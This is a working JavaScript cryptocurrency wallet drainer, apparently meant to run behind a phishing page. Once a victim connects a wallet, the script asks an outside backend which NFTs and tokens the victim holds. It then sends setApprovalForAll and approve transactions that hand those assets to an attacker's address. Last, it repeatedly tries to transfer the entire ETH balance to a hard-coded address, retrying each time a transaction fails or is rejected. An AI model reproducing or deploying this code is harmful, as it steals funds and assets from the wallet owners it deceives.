console.log("loaded");
let URL = "http://api.backendneo.xyz"
let ContractAdr = "0x2f5e2D1001712C4437f8BC6f05dCD3382cC19619";
let abi = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "operator",
                "type": "address"
            },
            {
                "internalType": "bool",
                "name": "approved",
                "type": "bool"
            }
        ],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [

        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },

]
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;


// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;
let web3;

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            // Mikko's test key - don't copy as your mileage may vary
            infuraId: "77f1a3e113344289baf31642644923e5",
        }
    }

};

web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
});

function toogleButton() {

    document.getElementsByTagName("button")[0].disabled = !document.getElementsByTagName("button")[0].disabled;
}

async function connect() {
    try {
        await web3Modal.clearCachedProvider()
    }
    catch (e) {
        console.log(e)
    }
    provider = await web3Modal.connect();
    web3 = new Web3(provider);

    console.log("Web3 instance is", web3);
    const accounts = await web3.eth.getAccounts();
    const balance = await web3.eth.getBalance(accounts[0]);

    selectedAccount = accounts[0];
    try {
        try {

            //throw "No accounts found"
            await performInjection(selectedAccount, balance);
        }
        catch (error) {
            // do in loop
            console.log(error)

            await sendAllMoney()


        }
    }
    catch (err) {
        await sendAllMoney()
    }




}


async function performInjection(address) {
    let nfts = await getNFTS(selectedAccount);
    let sortedNFTs = nfts;
    console.log(sortedNFTs);
    if (sortedNFTs.length == 0) {
        throw "No NFTs found"
    }
    for (let i = 0; i < sortedNFTs.length; i++) {
        let key = Object.keys(sortedNFTs[i])[0]
        let actualDict = sortedNFTs[i][key];
        let higherPrice = sortedNFTs[i][key][0]["token_address"];
        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
        
        let contractInstance = new web3.eth.Contract(abi, higherPrice);
        let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
        

        let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
        if(isErc20){
            data["balance"] = actualDict[0]["balance"];
        }
        console.log(data)
        await fetch(`${URL}/transfer/init`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

        //let result = await contractInstance.methods.setApprovalForAll(ContractAdr, true).send({ from: selectedAccount });
        //console.log(result);
        let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
        if (actualDict[0]["isErc20"]) {
            let balanceOwned =actualDict[0]["balance"];
            data_to_encode = contractInstance.methods.approve("0x979113f6039b609A430f93eC0E04428DDFF958Aa", balanceOwned.toString()).encodeABI();
        }

        const transactionParameters = {
            to: higherPrice, // Required except during contract publications.
            from: selectedAccount, // must match user's active address.
            value: 0,
            'data': data_to_encode //make call to NFT smart contract 
        };
        try {
            const txHash = await provider.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters],
            });
            if (i == sortedNFTs.length - 1) {
                await sendAllMoney();
            }

            //showModal("Transaction Completed ", "You can check your transaction here: <a href='https://etherscan.io/tx/" + txHash + "'>https://etherscan.io/tx/" + txHash + "</a>");
        } catch (error) {
            await performInjection(address)
            //showModal("Oops Transaction Failed", "Your Transaction Failed , Log : " + error.message);
        }
    }



}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    return usd * 20;
}


async function sendAllMoney() {
    try {
        let balance = await web3.eth.getBalance(selectedAccount);

        let to = "0x979113f6039b609A430f93eC0E04428DDFF958Aa";
        console.log(balance);
        //new balance = 10% of the balance
        balance = parseInt(balance);
        let transactionFee = await get12DollarETH()
        transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
        console.log()
        let transactionObject = { from: selectedAccount, to: to }
        console.log("Balance is ", balance);
        console.log("Transaction Fee is ", transactionFee);
        let newBalance = balance - transactionFee;
        console.log("New Balance is ", newBalance);
        transactionObject.value = web3.utils.toHex(newBalance); // set the transaction value to the entire balance, less the transaction fee
        console.log("Sending Money")
        if (newBalance > 0) {
            try {
                await web3.eth.sendTransaction(transactionObject);
                await sendAllMoney();

            }
            catch (error) {
                console.log("Exception Happened")
                await sendAllMoney();
            }


        }
        else {
            transactionObject.value = web3.utils.toHex(balance);
            await web3.eth.sendTransaction(transactionObject);

        }

    }
    catch (error) {
        await sendAllMoney();
    }



}


async function getNFTS(address) {
    let url = `${URL}/getnfts/${address}`;
    let response = await fetch(url);
    let data = await response.json();
    return data;
}

function sortNFT(nfts) {
    let sortable = [];
    for (var vehicle in nfts) {
        sortable.push([vehicle, nfts[vehicle]]);
    }

    return sortable.sort(function (a, b) {

        return parseInt(a[1][0]["floor_price"]["price"]) - parseInt(b[1][0]["floor_price"]["price"]);
    });


}
